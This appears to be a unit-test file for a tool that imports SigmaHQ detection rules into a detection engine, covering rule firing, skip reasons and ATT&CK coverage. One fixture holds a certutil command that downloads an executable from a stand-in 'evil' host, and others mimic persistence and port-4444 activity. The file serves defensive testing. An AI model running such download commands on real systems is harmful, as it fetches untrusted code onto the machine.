"""Unit tests for the SigmaHQ importer (no database)."""
from pathlib import Path

import yaml

from app import coverage, sigma_import
from app.detection.engine import DetectionEngine, load_rules, rule_from_dict
from app.models import NormalizedEvent

SIGMA = Path(__file__).resolve().parent.parent / "samples" / "sigma"
RULES_DIR = Path(__file__).resolve().parent.parent / "rules"


def _read(name: str) -> dict:
    return yaml.safe_load((SIGMA / name).read_text(encoding="utf-8"))


def _engine(name: str) -> DetectionEngine:
    rule, reason = sigma_import.translate(_read(name))
    assert reason is None and rule is not None, f"{name} unexpectedly skipped: {reason}"
    return DetectionEngine([rule_from_dict(rule, "sigma")])


def _fires(eng: DetectionEngine, **kw):
    return {r.id for r in eng.evaluate_event(NormalizedEvent(event_time=None, **kw))}


# ── translation fires on the right telemetry, and the logsource gate holds ────
def test_process_creation_rule_fires_and_is_gated():
    eng = _engine("proc_creation_certutil_download.yml")
    ev = dict(vendor="microsoft", product="sysmon",
              raw={"Image": r"C:\Windows\System32\certutil.exe",
                   "CommandLine": "certutil -urlcache -f http://evil/x.exe a"})
    assert _fires(eng, log_type="process-create", action="process-create", **ev)
    # identical indicators on a registry event must NOT fire — the logsource gate
    assert not _fires(eng, log_type="registry-set", action="registry-set", **ev)


def test_registry_and_network_and_linux_rules_fire():
    reg = _engine("registry_run_key_persistence.yml")
    assert _fires(reg, vendor="microsoft", action="registry-set",
                  raw={"TargetObject": r"HKLM\...\CurrentVersion\Run\evil"})

    net = _engine("net_conn_suspicious_port.yml")
    assert _fires(net, vendor="microsoft", action="network-connect", raw={"DestinationPort": 4444})
    assert not _fires(net, vendor="microsoft", action="network-connect", raw={"DestinationPort": 443})

    lnx = _engine("proc_creation_lnx_curl.yml")
    assert _fires(lnx, vendor="linux", action="process-create", raw={"Image": "/usr/bin/curl"})


# ── honest skips, each with a reason ─────────────────────────────────────────
def test_skip_reasons():
    assert sigma_import.translate(_read("skip_utf16_powershell.yml"))[1] \
        .startswith("unsupported-modifier")
    assert sigma_import.translate(_read("skip_deprecated.yml"))[1] == "status-deprecated"
    assert sigma_import.translate(_read("skip_unmapped_ps_script.yml"))[1] \
        .startswith("unmapped-logsource")
    # a Sigma correlation rule is deferred to Phase 5
    assert sigma_import.translate({"correlation": {"type": "event_count"},
                                   "detection": {"x": 1}})[1] == "sigma-correlation"
    # an aggregation condition (count()/near) can't run in our engine
    agg = {"logsource": {"category": "process_creation", "product": "windows"},
           "detection": {"selection": {"Image|endswith": r"\x.exe"},
                         "condition": "selection | count() by User > 5"}}
    assert sigma_import.translate(agg)[1] == "aggregation-condition"


# ── metadata / attribution / provenance ──────────────────────────────────────
def test_imported_rule_metadata_and_attribution():
    rule, _ = sigma_import.translate(_read("proc_creation_certutil_download.yml"))
    assert rule["id"] == "sigma-11111111-1111-4111-8111-111111111111"
    assert rule["fidelity"] == "medium"
    assert rule["data_source"] == ["process_creation"]
    assert "SigmaHQ" in rule["description"]
    assert any("SigmaHQ" in r for r in rule["references"])
    r = rule_from_dict(rule, "sigma")
    assert "T1105" in r.techniques and "command and control" in r.tactics


# ── directory import + report ────────────────────────────────────────────────
def test_translate_dir_report():
    rules, report = sigma_import.translate_dir(SIGMA)
    assert report["imported"] == 4                 # 4 importable fixtures
    assert report["skipped"] >= 3                  # utf16 / deprecated / unmapped
    assert {"status-deprecated"} <= set(report["reasons"])
    assert all(r["id"].startswith("sigma-") for r in rules)


def test_load_rules_scans_imported_subdir(tmp_path):
    (tmp_path / "imported").mkdir()
    rule, _ = sigma_import.translate(_read("registry_run_key_persistence.yml"))
    (tmp_path / "imported" / f"{rule['id']}.yml").write_text(
        sigma_import.dump_rule(rule), encoding="utf-8")
    loaded = load_rules(tmp_path)
    assert any(r.id == rule["id"] for r in loaded)


def test_imported_rules_add_attack_coverage():
    base = load_rules(RULES_DIR)
    imported = [rule_from_dict(r, "sigma") for r in sigma_import.translate_dir(SIGMA)[0]]
    before = set(coverage.attack_coverage(base)["techniques"])
    after = set(coverage.attack_coverage(base + imported)["techniques"])
    assert "T1571" in after - before                # the C2-port rule adds a new technique
